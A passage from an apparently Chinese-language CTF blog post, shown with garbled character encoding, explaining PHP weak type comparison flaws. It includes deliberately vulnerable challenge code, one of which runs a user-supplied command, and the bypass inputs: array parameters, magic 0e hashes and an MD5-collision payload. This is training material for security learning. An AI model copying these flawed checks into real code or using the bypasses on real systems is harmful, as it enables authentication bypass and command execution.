&lt;=&gt; $b;</span><br></pre></td></tr></table></figure><p>ç›¸å½“äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c = $a &gt; $b ? <span class="number">1</span> : ( $a==$b ? <span class="number">0</span> : <span class="number">-1</span> );</span><br></pre></td></tr></table></figure><ul><li>å½“ $a &gt; $b æ—¶ï¼Œ$c = 1</li><li>å½“ $a == $b æ—¶ï¼Œ$c = 0</li><li>å½“ $a &lt; $b æ—¶ï¼Œ$c = -1</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">$b = <span class="number">2</span>;</span><br><span class="line">$c = $a &lt;=&gt; $b;</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>-1</p></blockquote><p>ç»„åˆæ¯”è¾ƒè¿ç®—ç¬¦åŒæ ·å­˜åœ¨ == å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜ï¼ŒåŸç†åŒ <strong>â€œ==â€ä¸â€œ===â€</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;0e12&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;0e34&#x27;</span>;</span><br><span class="line">$c = $a &lt;=&gt; $b;</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>0</p></blockquote><h3 id="PHP-strcmp-å‡½æ•°"><a href="#PHP-strcmp-å‡½æ•°" class="headerlink" title="PHP strcmp() å‡½æ•°"></a>PHP strcmp() å‡½æ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> strcmp ( <span class="keyword">string</span> $str1 , <span class="keyword">string</span> $str2 )</span><br></pre></td></tr></table></figure><p>æ ¹æ®ACSIIè¡¨è¿›è¡Œæ¯”è¾ƒï¼Œä»å·¦åˆ°å³ä¾æ¬¡è¿›è¡Œï¼Œå‡ºç°ä¸åŒå°±åœæ­¢æ¯”è¾ƒï¼Œè¿”å›ç»“æœã€‚</p><p>å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// äºŒè¿›åˆ¶å®‰å…¨æ¯”è¾ƒå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span></span><br><span class="line"><span class="keyword">echo</span> strcmp(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>-1</p><p>å› ä¸ºâ€™Hâ€™çš„ASCIIå€¼æ¯”â€™hâ€™çš„å°ï¼Œæ‰€ä»¥è¿”å›è´Ÿæ•°</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=<span class="string">&quot;***&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">&#x27;password&#x27;</span>], $password) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>PHP5.3ä»¥ä¸Šç‰ˆæœ¬çš„strcmp()å­˜åœ¨æ¼æ´ï¼Œåªè¦$_GET[â€˜passwordâ€™]æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…ä¸€ä¸ªobjectå³å¯ç»•è¿‡ã€‚</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password[]&#x3D;a</span><br></pre></td></tr></table></figure><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="weak-type1"><a href="#weak-type1" class="headerlink" title="weak_type1"></a>weak_type1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$o = $_GET[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($o))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($o==<span class="number">520</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?o&#x3D;520a</span><br></pre></td></tr></table></figure><h3 id="weak-type3"><a href="#weak-type3" class="headerlink" title="weak_type3"></a>weak_type3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        $digit = ord($number&#123;$i&#125;);</span><br><span class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?key&#x3D;0xccccccccc</span><br></pre></td></tr></table></figure><h3 id="weak-type4"><a href="#weak-type4" class="headerlink" title="weak_type4"></a>weak_type4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="weak-type5"><a href="#weak-type5" class="headerlink" title="weak_type5"></a>weak_type5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $logined = <span class="literal">true</span>;</span><br><span class="line">    $username = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ctype_alpha($username)) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (md5($username) != md5($password)) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;login failed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>isset()  æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®</p><p>ctype_alphaå‡½æ•°åŠŸèƒ½å°±æ˜¯æ£€æµ‹æ˜¯å¦æ˜¯å­—ç¬¦</p><p>is_numeric æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</p></blockquote><p>usernameå¿…é¡»æ˜¯å­—æ¯ï¼Œpasswordå¿…é¡»æ˜¯æ•°å­—ï¼Œå†å°†ä¼ å…¥çš„usernameå’Œpasswordè¿›è¡Œmd5åŠ å¯†åè¿›è¡Œæ¯”è¾ƒä¸”ç»“æœè¦ç›¸ç­‰ã€‚</p><p>å¦‚æœmd5åŠ å¯†åçš„å€¼æ˜¯0eå¼€å¤´ï¼Œè¿™æ ·å°±å­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜å°±å¯ä»¥é€šè¿‡ï¼Œæ‰€ä»¥è¦æƒ³å¾—åˆ°flagï¼Œå¾—å¯»æ‰¾çº¯å­—æ¯å’Œçº¯æ•°å­—md5åŠ å¯†åæ˜¯0eå¼€å¤´çš„å€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) == md5(<span class="string">&#x27;240610708&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;QNKCDZO&amp;password&#x3D;240610708</span><br></pre></td></tr></table></figure><h3 id="weak-type6"><a href="#weak-type6" class="headerlink" title="weak_type6"></a>weak_type6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°è¯•ä½¿ç”¨<strong>weak_type4</strong>çš„<code>a[]=1&amp;b[]=2</code>ï¼Œå‘ç°ä¸è¡Œï¼Œæµ‹è¯•åå‘ç°æ•°ç»„è¢«å¼ºåˆ¶è£…æ¢ä¸ºå­—ç¬¦ä¸²åéƒ½æ˜¯Array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_POST[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=&quot;</span>.(<span class="keyword">string</span>)$a.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b=&quot;</span>.(<span class="keyword">string</span>)$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>a=Array</p><p>b=Array</p></blockquote><p>å‚è€ƒ<a href="https://blog.csdn.net/weixin_41185953/article/details/83786862">MD5ç¢°æ’</a>åï¼Œç”¨burp suiteæŠ“åŒ…</p><p><a href="https://imgchr.com/i/BYSB1H"><img src="https://s1.ax1x.com/2020/10/29/BYSB1H.png" alt="BYSB1H.png"></a></p><p><a href="https://imgchr.com/i/BYS5cj"><img src="https://s1.ax1x.com/2020/10/29/BYS5cj.png" alt="BYS5cj.png"></a></p><p><code>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></p><h3 id="å¤©èä¿¡é¢è¯•é¢˜"><a href="#å¤©èä¿¡é¢è¯•é¢˜" class="headerlink" title="å¤©èä¿¡é¢è¯•é¢˜"></a>å¤©èä¿¡é¢è¯•é¢˜</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;form action&#x3D;&quot;index.php&quot; class&#x3D;&quot;authform&quot; method&#x3D;&quot;post&quot; accept-charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;legend&gt;Unbreakable Random&lt;&#x2F;legend&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;s&quot; name&#x3D;&quot;s&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;seed&quot; &#x2F;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;h&quot; name&#x3D;&quot;h&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;hash&quot; &#x2F;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class&#x3D;&quot;return-value&quot; style&#x3D;&quot;padding: 10px 0&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function gen_secured_random() &#123; &#x2F;&#x2F; cause random is the way</span><br><span class="line">    $a &#x3D; rand(1337,2600)*42;</span><br><span class="line">    $b &#x3D; rand(1879,1955)*42;</span><br><span class="line"></span><br><span class="line">    $a &lt; $b ? $a ^&#x3D; $b ^&#x3D; $a ^&#x3D; $b : $a &#x3D; $b;</span><br><span class="line"></span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function secured_hash_function($plain) &#123; &#x2F;&#x2F; cause md5 is the best hash ever</span><br><span class="line">    $secured_plain &#x3D; sanitize_user_input($plain);</span><br><span class="line">    return md5($secured_plain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sanitize_user_input($input) &#123; &#x2F;&#x2F; cause someone told me to never trust user input</span><br><span class="line">    $re &#x3D; &#39;&#x2F;[^a-zA-Z0-9]&#x2F;&#39;;</span><br><span class="line">    $secured_input &#x3D; preg_replace($re, &quot;&quot;, $input);</span><br><span class="line">    return $secured_input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">require_once &quot;secret.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;s&#39;]) &amp;&amp; isset($_POST[&#39;h&#39;])) &#123;</span><br><span class="line">    $s &#x3D; sanitize_user_input($_POST[&#39;s&#39;]);</span><br><span class="line">    $h &#x3D; secured_hash_function($_POST[&#39;h&#39;]);</span><br><span class="line">    $r &#x3D; gen_secured_random();</span><br><span class="line">    if($s !&#x3D; false &amp;&amp; $h !&#x3D; false) &#123;</span><br><span class="line">        if($s.$r &#x3D;&#x3D; $h) &#123;</span><br><span class="line">            print &quot;Well done! Here is your flag: &quot;.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            print &quot;Fail...&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        print &quot;&lt;p&gt;Hum ...&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;p&gt;&lt;em&gt;&lt;a href&#x3D;&quot;index.php?source&quot;&gt;source code&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å‡ ä¸ªå‡½æ•°çš„ä½œç”¨</p><ul><li>gen_secured_random()</li></ul><p>è™½ç„¶ä¸çŸ¥é“<code>$a ^= $b ^= $a ^= $b</code>çš„ç»“æœä¼šæ˜¯æ€ä¹ˆæ ·çš„ï¼Œä½†$a+$bçš„å€¼çš„é•¿åº¦éƒ½æ˜¯å…­ä½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt; <span class="number">100</span>; $i++)&#123;</span><br><span class="line">$a = rand(<span class="number">1337</span>,<span class="number">2600</span>)*<span class="number">42</span>;</span><br><span class="line">$b = rand(<span class="number">1879</span>,<span class="number">1955</span>)*<span class="number">42</span>;</span><br><span class="line">$a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($a+$b) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä¸æ˜¯6ä½æ•°&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;i = &quot;</span>.$i;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>i = 100</p></blockquote><ul><li>sanitize_user_input($input)</li></ul><p>å¯¹ä¼ è¿›æ¥çš„$inputè¿›è¡Œè¿‡æ»¤ï¼Œå°†ä¸æ˜¯26ä¸ªå­—æ¯å’Œæ•°å­—çš„å­—ç¬¦æ›¿æ¢ä¸ºç©º</p><ul><li>secured_hash_function($plain)</li></ul><p>è°ƒç”¨sanitize_user_input()å‡½æ•°ï¼Œå¯¹ä¼ è¿›æ¥çš„$plainè¿›è¡Œè¿‡æ»¤ï¼Œè¿”å›è¿‡æ»¤åçš„md5å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$s = sanitize_user_input($_POST[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line">$h = secured_hash_function($_POST[<span class="string">&#x27;h&#x27;</span>]);</span><br><span class="line">$r = gen_secured_random();</span><br><span class="line"><span class="keyword">if</span>($s != <span class="literal">false</span> &amp;&amp; $h != <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Well done! Here is your flag: &quot;</span>.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹ä¼ è¿›æ¥çš„$sï¼Œè¿‡æ»¤æ‰å…¶å®ƒå­—ç¬¦ï¼Œå‰©ä¸‹å­—æ¯å’Œæ•°å­—</p><p>$hä¹Ÿè¿‡æ»¤æ‰åè¿›è¡Œmd5åŠ å¯†</p><p>$rä¸ºä¸€ä¸ª6ä½æ•°çš„æ•°</p><p>å¦‚æœ$så’Œ$héƒ½ä¸ç­‰äºfalse ä»¥åŠ $sæ‹¼æ¥ä¸Š$råå¦‚æœå’Œ$hç›¸ç­‰çš„è¯ï¼Œå°±å¯ä»¥å¾—åˆ°flag</p><p>è¿™é‡Œçš„<code>==</code>å­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒé—®é¢˜</p><blockquote><p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&quot;0e123456789&quot;</span> == <span class="string">&quot;0&quot;</span>);<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(<span class="string">&quot;0e123456789&quot;</span> === <span class="string">&quot;0&quot;</span>);<span class="comment">//bool(false)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å·²çŸ¥ç”¨md5åŠ å¯†<code>s878926199a</code>åçš„ç»“æœæ˜¯ä»¥0eå¼€å¤´çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> md5(<span class="string">&quot;s878926199a&quot;</span>);</span><br><span class="line"><span class="comment">//0e545993274517709034328855841020</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥$h=s878926199aï¼Œmd5åŠ 